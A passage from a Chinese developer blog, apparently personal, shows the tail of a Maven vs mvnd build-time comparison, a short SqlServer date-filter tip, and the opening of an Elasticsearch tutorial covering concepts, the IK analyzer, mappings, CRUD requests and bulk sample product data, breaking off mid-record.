<p>内存：16GB</p>
<p>结果如下：</p>
<ul>
<li>13 个子项目</li>
</ul>
<p><img src="https://brath.cloud/blogImg/v2-dd0b655c2c27661612a479ef242058c8_720w.jpg" alt="img">41 秒 vs 21 秒</p>
<p>可以看到 <strong>mvnd 打包的总时间比 mvn 快了不少</strong>，因为 mvnd 使用了 CPU 的多核心，可以看到每个子模块打包的时间都差不多，所以在单核的机器，就不要尝试使用 mvnd 了。</p>
<ul>
<li>19 个子项目</li>
</ul>
<p><img src="https://brath.cloud/blogImg/v2-0a301e678b6ebab5577d899b6230ffe5_720w.jpg" alt="img">32 秒 vs 10 秒</p>
<p>呈现子项目越多，相对速度更快的趋势。</p>
<p>总的来说：</p>
<p><strong>如果项目模块很多，可以尝试使用 mvnd 进行辅助打包，比如 测试、生产，可以节省很多时间；</strong></p>
<p><strong>开发则可以继续使用 mvn ，毕竟 IDEA 无法集成 mvnd，可以在 terminal 通过命令打包。</strong></p>
<h2 id="关于我"><a class="markdownIt-Anchor" href="#关于我">#</a> 关于我</h2>
<p>Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png" alt="InterviewCoder"></p>
<p>非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-03-29T04:21:33.000Z" title="2023/3/29 12:21:33">2023-03-29</time>发表</span><span class="level-item"><time dateTime="2020-10-18T22:03:43.000Z" title="2020/10/19 06:03:43">2020-10-19</time>更新</span><span class="level-item">1 分钟读完 (大约205个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/03/29/%E3%80%90SqlServer%E3%80%91SqlServer%E6%9F%A5%E8%AF%A2%E4%BB%8A%E6%97%A5%E5%92%8C%E6%98%A8%E6%97%A5%E6%95%B0%E6%8D%AE/">【SqlServer】SqlServer查询今日和昨日数据</a></p><div class="content"><p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png" alt="InterviewCoder"></p>
<h1 id="sqlserversqlserver查询今日和昨日数据"><a class="markdownIt-Anchor" href="#sqlserversqlserver查询今日和昨日数据">#</a> 【SqlServer】SqlServer 查询今日和昨日数据</h1>
<p>在 where 后加入以下<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=sql%E8%AF%AD%E5%8F%A5&amp;spm=1001.2101.3001.7020"> sql 语句</a></p>
<p>今天：</p>
<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where <span class="built_in">DateDiff</span>(dd,时间字段,<span class="keyword">get</span><span class="built_in">date</span>())=<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>昨天：</p>
<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where <span class="built_in">DateDiff</span>(dd,时间字段,<span class="keyword">get</span><span class="built_in">date</span>())=<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h1 id="关于我"><a class="markdownIt-Anchor" href="#关于我">#</a> 关于我</h1>
<p>Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png" alt="InterviewCoder"></p>
<p>非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-03-27T20:44:21.000Z" title="2023/3/28 04:44:21">2023-03-28</time>发表</span><span class="level-item"><time dateTime="2023-09-06T01:04:52.000Z" title="2023/9/6 09:04:52">2023-09-06</time>更新</span><span class="level-item">1 小时读完 (大约7699个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/03/28/%E3%80%90Elasticsearch%E3%80%91Elasticsearch/">Elasticsearch学习</a></p><div class="content"><p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png" alt="InterviewCoder"></p>
<h1 id="elasticsearch"><a class="markdownIt-Anchor" href="#elasticsearch">#</a> Elasticsearch</h1>
<p><img src="https://images-jsh.oss-cn-beijing.aliyuncs.com/img/elasticsearch.jpg" alt="img"></p>
<h2 id="目标"><a class="markdownIt-Anchor" href="#目标">#</a> 目标</h2>
<ul>
<li>了解 ES 中的基本概念</li>
<li>掌握 RESTFul 操作 ES 的 CRUD</li>
<li>掌握 Spring Data Elasticsearch 操作 ES</li>
</ul>
<h2 id="简介"><a class="markdownIt-Anchor" href="#简介">#</a> 简介</h2>
<p>Elasticsearch 是一个基于 Lucene 的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于 RESTful web 接口。Elasticsearch 是用 Java 开发的，并作为 Apache 许可条款下的开放源码发布，是当前流行的企业级搜索引擎。设计用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。</p>
<p>我们建立一个网站或应用程序，并要添加搜索功能，但是想要完成搜索工作的创建是非常困难的。我们希望搜索解决方案要运行速度快，我们希望能有一个零配置和一个完全免费的搜索模式，我们希望能够简单地使用 JSON 通过 HTTP 来索引数据，我们希望我们的搜索服务器始终可用，我们希望能够从一台开始并扩展到数百台，我们要实时搜索，我们要简单的多用户，我们希望建立一个云的解决方案。因此我们利用 Elasticsearch 来解决所有这些问题及可能出现的更多其它问题。</p>
<h2 id="安装和运行"><a class="markdownIt-Anchor" href="#安装和运行">#</a> 安装和运行</h2>
<p>该软件是基于 Java 编写的解压即用的软件，只需要有 Java 的运行环境即可，把压缩包解压后，进入到 bin 目录运行 elasticsearch.bat，出现以下界面，表示成功启动服务器</p>
<p><img src="https://images-jsh.oss-cn-beijing.aliyuncs.com/img/20190606092632.png" alt="img"></p>
<p>浏览器输入：<strong>localhost:9200</strong>，看到浏览器输出服务器的信息，表示安装成功，可以使用了</p>
<p><img src="https://images-jsh.oss-cn-beijing.aliyuncs.com/img/20190606093141.png" alt="img"></p>
<p>注意：程序启动后有两个端口 9200 和 9300，9200 端口用于 HTTP 协议，基于 RESTFul 来使用，9300 端口用于 TCP 协议，基于 jar 包来使用</p>
<h3 id="后台启动"><a class="markdownIt-Anchor" href="#后台启动">#</a> 后台启动</h3>
<p>使用<strong>安装目录 /bin/elasticsearch-service.bat</strong> 程序可以把 Elasticsearch 安装后服务列表中，以后我们可以在服务列表来启动该程序，也可以设置成开机启动模式</p>
<p>注意：设置后台启动需要手动配置 Java 虚拟机的路径，使用命令<strong> elasticsearch-service.bat manager</strong> 来配置</p>
<p><img src="https://images-jsh.oss-cn-beijing.aliyuncs.com/img/20190622211819.png" alt="img"></p>
<h3 id="安装head插件"><a class="markdownIt-Anchor" href="#安装head插件">#</a> 安装 head 插件</h3>
<p>Elasticsearch 默认的客户端工具是命令行形式的，操作起来不方便，也不直观看到数据的展示，所以我们需要去安装一个可视化插件，但是这些插件都是基于 H5 开发的，在谷歌的应用商店中找到<strong> elasticsearch-head</strong> 插件，然后安装，使用该插件能比较直观的展示服务器中的数据</p>
<h3 id="安装kibana"><a class="markdownIt-Anchor" href="#安装kibana">#</a> 安装 kibana</h3>
<p>该软件也是解压即用的工具，用于管理和监控 Elasticsearch 的运作，同时内部包含了客户端工具，支持 RESTFul 操作 Elasticsearch。解压后运行 bin/kibana.bat，看到启动成功的端口号即可以使用浏览器来使用了</p>
<p><img src="https://images-jsh.oss-cn-beijing.aliyuncs.com/img/20190606141235.png" alt="img"></p>
<p>浏览器输入：<a target="_blank" rel="noopener" href="http://localhost:5601/">http://localhost:5601</a></p>
<h2 id="概念名词"><a class="markdownIt-Anchor" href="#概念名词">#</a> 概念名词</h2>
<h3 id="数据存储图"><a class="markdownIt-Anchor" href="#数据存储图">#</a> 数据存储图</h3>
<p><img src="https://images-jsh.oss-cn-beijing.aliyuncs.com/img/20190604113843.png" alt="img"></p>
<p>注意：从 Elasticsearch6 开始一个索引里面只能有一个类型，后续计划删除类型这个概念，从 ES6 开始一般让索引名称和类型名称一致</p>
<h3 id="主要组件"><a class="markdownIt-Anchor" href="#主要组件">#</a> 主要组件</h3>
<ul>
<li>
<p>索引</p>
<p>ES 将数据存储于一个或多个索引中，索引是具有类似特性的文档的集合。类比传统的关系型数据库领域来说，索引相当于 SQL 中的一个数据库，或者一个数据存储方案 (schema)。索引由其名称 (必须为全小写字符) 进行标识，并通过引用此名称完成文档的创建、搜索、更新及删除操作。一个 ES 集群中可以按需创建任意数目的索引。</p>
</li>
<li>
<p>类型</p>
<p>类型是索引内部的逻辑分区 (category/partition)，然而其意义完全取决于用户需求。因此，一个索引内部可定义一个或多个类型 (type)。一般来说，类型就是为那些拥有相同的域的文档做的预定义。例如，在索引中，可以定义一个用于存储用户数据的类型，一个存储日志数据的类型，以及一个存储评论数据的类型。类比传统的关系型数据库领域来说，类型相当于表。</p>
</li>
<li>
<p>映射</p>
<p>Mapping, 就是对索引库中索引的字段名称及其数据类型进行定义，类似于 mysql 中的表结构信息。不过 es 的 mapping 比数据库灵活很多，它可以动态识别字段。一般不需要指定 mapping 都可以，因为 es 会自动根据数据格式识别它的类型，如果你需要对某些字段添加特殊属性（如：定义使用其它分词器、是否分词、是否存储等），就必须手动添加 mapping。</p>
<p>需要注意的是映射是不可修改的，一旦确定就不允许改动，在使用自动识别功能时，会以第一个存入的文档为参考来建立映射，后面存入的文档也必须符合该映射才能存入</p>
</li>
<li>
<p>文档</p>
<p>文档是 Lucene 索引和搜索的原子单位，它是包含了一个或多个域的容器，基于 JSON 格式进行表示。文档由一个或多个域组成，每个域拥有一个名字及一个或多个值，有多个值的域通常称为多值域。每个文档可以存储不同的域集，但同一类型下的文档至应该有某种程度上的相似之处。</p>
</li>
</ul>
<h3 id="分片和副本"><a class="markdownIt-Anchor" href="#分片和副本">#</a> 分片和副本</h3>
<p>ES 的分片 (shard) 机制可将一个索引内部的数据分布地存储于多个节点，它通过将一个索引切分为多个底层物理的 Lucene 索引完成索引数据的分割存储功能，这每一个物理的 Lucene 索引称为一个分片 (shard)。每个分片其内部都是一个全功能且独立的索引，因此可由集群中的任何主机存储。创建索引时，用户可指定其分片的数量，默认数量为 5 个。</p>
<p>Shard 有两种类型：primary 和 replica，即主 shard 及副本 shard。Primary shard 用于文档存储，每个新的索引会自动创建 5 个 Primary shard，当然此数量可在索引创建之前通过配置自行定义，不过，一旦创建完成，其 Primary shard 的数量将不可更改。Replica shard 是 Primary Shard 的副本，用于冗余数据及提高搜索性能。每个 Primary shard 默认配置了一个 Replica shard，但也可以配置多个，且其数量可动态更改。ES 会根据需要自动增加或减少这些 Replica shard 的数量。</p>
<h3 id="分词器"><a class="markdownIt-Anchor" href="#分词器">#</a> 分词器</h3>
<p>把文本内容按照标准进行切分，默认的是 standard，该分词器按照单词切分，内容转变为小写，去掉标点，遇到每个中文字符都当成 1 个单词处理，后面会安装开源的中文分词器插件（ik）</p>
<h4 id="感受分词器效果"><a class="markdownIt-Anchor" href="#感受分词器效果">#</a> 感受分词器效果</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">先创建一个名叫shop_product的索引，然后再感受分词效果</span><br><span class="line">PUT /shop_product</span><br><span class="line"></span><br><span class="line">默认分词器：</span><br><span class="line">GET /shop_product/_analyze</span><br><span class="line">&#123;</span><br><span class="line">  &quot;text&quot;:&quot;I am Groot&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET /shop_product/_analyze</span><br><span class="line">&#123;</span><br><span class="line">  &quot;text&quot;:&quot;英特尔酷睿i7处理器&quot;</span><br><span class="line">&#125;</span><br><span class="line">结论：默认的分词器只能对英文正常分词，不能对中文正常分词</span><br></pre></td></tr></table></figure>
<h4 id="安装ik分词器"><a class="markdownIt-Anchor" href="#安装ik分词器">#</a> 安装 IK 分词器</h4>
<p>直接把压缩文件中的内容解压，然后放在 elasticsearch/plugins 下，然后重启即可</p>
<p><img src="https://images-jsh.oss-cn-beijing.aliyuncs.com/img/20190611130218.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">IK分词器：</span><br><span class="line">ik_smart：粗力度分词</span><br><span class="line">ik_max_word：细力度分词</span><br><span class="line"></span><br><span class="line">GET /shop_product/_analyze</span><br><span class="line">&#123;</span><br><span class="line">  &quot;text&quot;:&quot;I am Groot&quot;,</span><br><span class="line">  &quot;analyzer&quot;:&quot;ik_smart&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET /shop_product/_analyze</span><br><span class="line">&#123;</span><br><span class="line">  &quot;text&quot;:&quot;英特尔酷睿i7处理器&quot;,</span><br><span class="line">  &quot;analyzer&quot;:&quot;ik_smart&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET /shop_product/_analyze</span><br><span class="line">&#123;</span><br><span class="line">  &quot;text&quot;:&quot;英特尔酷睿i7处理器&quot;,</span><br><span class="line">  &quot;analyzer&quot;:&quot;ik_max_word&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">结论：都能正常分词</span><br></pre></td></tr></table></figure>
<h4 id="拓展词库"><a class="markdownIt-Anchor" href="#拓展词库">#</a> 拓展词库</h4>
<p>最简单的方式就是找到 IK 插件中的<strong> config/main.dic</strong> 文件，往里面添加新的词汇，然后重启服务器即可</p>
<h3 id="倒排索引"><a class="markdownIt-Anchor" href="#倒排索引">#</a> 倒排索引</h3>
<p><img src="https://images-jsh.oss-cn-beijing.aliyuncs.com/img/20190604141259.png" alt="img"></p>
<h2 id="基本操作了解"><a class="markdownIt-Anchor" href="#基本操作了解">#</a> 基本操作（了解）</h2>
<h3 id="索引操作"><a class="markdownIt-Anchor" href="#索引操作">#</a> 索引操作</h3>
<p>建表索引，相当于在是在建立数据库</p>
<h4 id="建立索引"><a class="markdownIt-Anchor" href="#建立索引">#</a> 建立索引</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">语法：PUT /索引名</span><br><span class="line">在没有特殊设置的情况下，默认有5个分片，1个备份，也可以通过请求参数的方式来指定</span><br><span class="line">参数格式：</span><br><span class="line">&#123;</span><br><span class="line">  &quot;settings&quot;: &#123;</span><br><span class="line">    &quot;number_of_shards&quot;: 5, //设置5个片区</span><br><span class="line">    &quot;number_of_replicas&quot;: 1 //设置1个备份</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="删除索引"><a class="markdownIt-Anchor" href="#删除索引">#</a> 删除索引</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语法：DELETE /索引名</span><br></pre></td></tr></table></figure>
<h3 id="映射操作"><a class="markdownIt-Anchor" href="#映射操作">#</a> 映射操作</h3>
<h4 id="建立索引和映射"><a class="markdownIt-Anchor" href="#建立索引和映射">#</a> 建立索引和映射</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">语法：PUT /索引名</span><br><span class="line">&#123;</span><br><span class="line">  &quot;mappings&quot;: &#123;</span><br><span class="line">    类型名: &#123;</span><br><span class="line">      &quot;properties..0&quot;: &#123;</span><br><span class="line">        字段名: &#123;</span><br><span class="line">          &quot;type&quot;: 字段类型, </span><br><span class="line">          &quot;analyzer&quot;: 分词器类型, </span><br><span class="line">          &quot;search_analyzer&quot;: 分词器类型,</span><br><span class="line">          ...</span><br><span class="line">        &#125;,</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">字段类型：double / long / integer / text / keyword / date / binary</span><br><span class="line">注意：text和keyword都是字符串类型，但是只有text类型的数据才能分词，字段的配置一旦确定就不能更改</span><br><span class="line">映射的配置项有很多，我们可以根据需要只配置用得上的属性</span><br></pre></td></tr></table></figure>
<h4 id="查询映射"><a class="markdownIt-Anchor" href="#查询映射">#</a> 查询映射</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语法：GET /索引名/_mapping</span><br></pre></td></tr></table></figure>
<h2 id="crud操作"><a class="markdownIt-Anchor" href="#crud操作">#</a> CRUD 操作</h2>
<h3 id="文档操作"><a class="markdownIt-Anchor" href="#文档操作">#</a> 文档操作</h3>
<h4 id="新增和替换文档"><a class="markdownIt-Anchor" href="#新增和替换文档">#</a> 新增和替换文档</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">语法：PUT /索引名/类型名/文档ID</span><br><span class="line">&#123;</span><br><span class="line">  field1: value1,</span><br><span class="line">  field2: value2,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">注意：当索引/类型/映射不存在时，会使用默认设置自动添加</span><br><span class="line">ES中的数据一般是从别的数据库导入的，所以文档的ID会沿用原数据库中的ID</span><br><span class="line">索引库中没有该ID对应的文档时则新增，拥有该ID对应的文档时则替换</span><br><span class="line"></span><br><span class="line">需求1：新增一个文档</span><br><span class="line">需求2：替换一个文档</span><br></pre></td></tr></table></figure>
<p>每一个文档都内置以下字段</p>
<blockquote>
<p>_index：所属索引</p>
<p>_type：所属类型</p>
<p>_id：文档 ID</p>
<p>_version：乐观锁版本号</p>
<p>_source：数据内容</p>
</blockquote>
<h4 id="查询文档"><a class="markdownIt-Anchor" href="#查询文档">#</a> 查询文档</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">语法：</span><br><span class="line">根据ID查询 -&gt; GET /索引名/类型名/文档ID</span><br><span class="line">查询所有（基本查询语句） -&gt; GET /索引名/类型名/_search</span><br><span class="line"></span><br><span class="line">需求1：根据文档ID查询一个文档</span><br><span class="line">需求2：查询所有的文档</span><br></pre></td></tr></table></figure>
<p>查询所有结果中包含以下字段</p>
<blockquote>
<p>took：耗时</p>
<p>_shards.total：分片总数</p>
<p>hits.total：查询到的数量</p>
<p>hits.max_score：最大匹配度</p>
<p>hits.hits：查询到的结果</p>
<p>hits.hits._score：匹配度</p>
</blockquote>
<h4 id="删除文档"><a class="markdownIt-Anchor" href="#删除文档">#</a> 删除文档</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">语法：DELETE /索引名/类型名/文档ID</span><br><span class="line">注意：这里的删除并且不是真正意义上的删除，仅仅是清空文档内容而已，并且标记该文档的状态为删除</span><br><span class="line"></span><br><span class="line">需求1：根据文档ID删除一个文档</span><br><span class="line">需求2：替换刚刚删除的文档</span><br></pre></td></tr></table></figure>
<h2 id="高级查询"><a class="markdownIt-Anchor" href="#高级查询">#</a> 高级查询</h2>
<p>数据准备：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">PUT /shop_product</span><br><span class="line">&#123;</span><br><span class="line">  &quot;mappings&quot;: &#123;</span><br><span class="line">    &quot;shop_product&quot;: &#123;</span><br><span class="line">      &quot;properties&quot;: &#123;</span><br><span class="line">        &quot;id&quot;: &#123;</span><br><span class="line">          &quot;type&quot;: &quot;integer&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;title&quot;:&#123;</span><br><span class="line">          &quot;type&quot;: &quot;text&quot;, </span><br><span class="line">          &quot;analyzer&quot;: &quot;ik_smart&quot;, </span><br><span class="line">          &quot;search_analyzer&quot;: &quot;ik_smart&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;price&quot;:&#123;</span><br><span class="line">          &quot;type&quot;: &quot;double&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;intro&quot;:&#123;</span><br><span class="line">          &quot;type&quot;: &quot;text&quot;, </span><br><span class="line">          &quot;analyzer&quot;: &quot;ik_smart&quot;, </span><br><span class="line">          &quot;search_analyzer&quot;: &quot;ik_smart&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;brand&quot;:&#123;</span><br><span class="line">          &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST /shop_product/shop_product/_bulk</span><br><span class="line">&#123;&quot;create&quot;:&#123;&quot;_id&quot;: 1&#125;&#125;</span><br><span class="line">&#123;&quot;id&quot;:1,&quot;title&quot;:&quot;Apple iPhone XR (A2108) 128GB 白色 移动联通电信4G手机 双卡双待&quot;,&quot;price&quot;:5299,&quot;intro&quot;:&quot;【iPhoneXR限时特惠！】6.1英寸视网膜显示屏，A12仿生芯片，面容识别，无线充电，支持双卡！选【换修无忧版】获 AppleCare 原厂服务，享只换不修！更有快速换机、保值换新、轻松月付！&quot;,&quot;brand&quot;:&quot;Apple&quot;&#125;</span><br><span class="line">&#123;&quot;create&quot;:&#123;&quot;_id&quot;: 2&#125;&#125;</span><br><span class="line">&#123;&quot;id&quot;:2,&quot;title&quot;:&quot;Apple 2019款 Macbook Pro 13.3【带触控栏】八代i7 18G 256G RP645显卡 深空灰 苹果笔记本电脑 轻薄本 MUHN2CH/A&quot;,&quot;price&quot;:15299,&quot;intro&quot;:&quot;【八月精选】Pro2019年新品上市送三重好礼，现在购买领满8000减400元优惠神劵，劵后更优惠！&quot;,&quot;brand&quot;:&quot;Apple&quot;&#125;</span><br><span class="line">&#123;&quot;create&quot;:&#123;&quot;_id&quot;: 3&#125;&#125;</span><br><span class="line">&#123;&quot;id&quot;:3,&quot;title&quot;:&quot;Apple iPad Air 3 2019年新款平板电脑 10.5英寸（64G WLAN版/A12芯片/Retina显示屏/MUUL2CH/A）金色&quot;,&quot;price&quot;:3788,&quot;intro&quot;:&quot;8月尊享好礼！买iPad即送蓝牙耳机！领券立减！多款产品支持手写笔！【新一代iPad，总有一款适合你】选【换修无忧版】获 AppleCare 原厂服务，享只换不修！更有快速换机、保值换新、轻松月付！&quot;,&quot;brand&quot;:&quot;Apple&quot;&#125;</span><br><span class="line">&#123;&quot;create&quot;:&#123;&quot;_id&quot;: 4&#125;&#125;</span><br><span class="line">&#123;&quot;id&quot;:4,&quot;title&quot;:&quot;华为HUAWEI MateBook X Pro 2019款 英特尔酷睿i5 13.9英寸全面屏轻薄笔记本电脑(i5 8G 512G 3K 触控) 灰&quot;,&quot;price&quot;:7999,&quot;intro&quot;:&quot;3K全面屏开启无界视野;轻薄设计灵动有型，HuaweiShare一碰传&quot;,&quot;brand&quot;:&quot;华为&quot;&#125;</span><br><span class="line">&#123;&quot;create&quot;:&#123;&quot;_id&quot;: 5&#125;&#125;</span><br><span class="line">&#123;&quot;id&quot;:5,&quot;title&quot;:&quot;华为 HUAWEI Mate20 X (5G) 7nm工艺5G旗舰芯片全面屏超大广角徕卡三摄8GB+256GB翡冷翠5G双模全网通手机&quot;,&quot;price&quot;:6199,&quot;intro&quot;:&quot;【5G双模，支持SA/NSA网络，7.2英寸全景巨屏，石墨烯液冷散热】5G先驱，极速体验。&quot;,&quot;brand&quot;:&quot;华为&quot;&#125;</span><br><span class="line">&#123;&quot;create&quot;:&#123;&quot;_id&quot;: 6&#125;&#125;</span><br><span class="line">&#123;&quot;id&quot;:6,&quot;title&quot;:&quot;华为平板 M6 10.8英寸麒麟980影音娱乐平板电脑4GB+64GB WiFi（香槟金）&quot;,&quot;price&quot;:2299,&quot;intro&quot;:&quot;【华为暑期购】8月2日-4日，M5青春版指定爆款型号优惠100元，AI语音控制&quot;,&quot;brand&quot;:&quot;华为&quot;&#125;</span><br><span class="line">&#123;&quot;create&quot;:&#123;&quot;_id&quot;: 7&#125;&#125;</span><br><span class="line">&#123;&quot;id&quot;:7,&quot;title&quot;:&quot;荣耀20 PRO DXOMARK全球第二高分 4800万四摄 双光学防抖 麒麟980 全网通4G 8GB+128GB 蓝水翡翠 拍照手机&quot;,&quot;price&quot;:3199,&quot;intro&quot;:&quot;白条6期免息！麒麟980，4800万全焦段AI四摄！荣耀20系列2699起，4800万超广角AI四摄！&quot;,&quot;brand&quot;:&quot;荣耀&quot;&#125;</span><br><span class="line">&#123;&quot;create&quot;:&#123;&quot;_id&quot;: 8&#125;&#125;</span><br><span class="line">&#123;&quot;id&quot;:8,&quot;title&quot;:&quot;荣耀MagicBook Pro 16.1英寸全面屏轻薄性能笔记本电脑（酷睿i7 8G 512G MX250 IPS FHD 指纹解锁）冰河银&quot;,&quot;price&quot;:6199,&quot;intro&quot;:&quot;16.1英寸无界全面屏金属轻薄本，100%sRGB色域，全高清IPS防眩光护眼屏，14小时长续航，指纹一健开机登录，魔法一碰传高速传输。&quot;,&quot;brand&quot;:&quot;荣耀&quot;&#125;</span><br><span class="line">&#123;&quot;create&quot;:&#123;&quot;_id&quot;: 9&#125;&#125;</span><br><span class="line">&#123;&quot;id&quot;:9,&quot;title&quot;:&quot;荣耀平板5 麒麟8核芯片 GT游戏加速 4G+128G 10.1英寸全高清屏影音平板电脑 WiFi版 冰川蓝&quot;,&quot;price&quot;:1549,&quot;intro&quot;:&quot;【爆款平板推荐】哈曼卡顿专业调音，10.1英寸全高清大屏，双喇叭立体环绕音，配置多重护眼，值得拥有！&quot;,&quot;brand&quot;:&quot;荣耀&quot;&#125;</span><br><span class="line">&#123;&quot;create&quot;:&#123;&quot;_id&quot;: 10&#125;&#125;</span><br><span class="line">&#123;&quot;id&quot;:10,&quot;title&quot;:&quot;小米9 4800万超广角三摄 6GB+128GB全息幻彩蓝 骁龙855 全网通4G 双卡双待 